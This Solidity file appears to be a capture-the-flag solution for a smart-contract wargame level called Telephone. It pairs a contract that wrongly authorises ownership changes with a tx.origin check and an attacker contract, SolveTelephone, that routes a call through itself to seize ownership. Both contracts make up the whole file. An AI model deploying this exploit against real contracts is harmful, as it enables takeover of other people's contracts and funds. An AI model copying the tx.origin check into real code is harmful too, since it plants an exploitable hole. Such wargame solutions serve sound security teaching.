// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract SolveTelephone{
    
    Telephone public tel;

    constructor(address _telephone){
        tel = Telephone(_telephone);
    }
    function callTelephone(address _myAddress) public{
        tel.changeOwner(_myAddress);
    }
}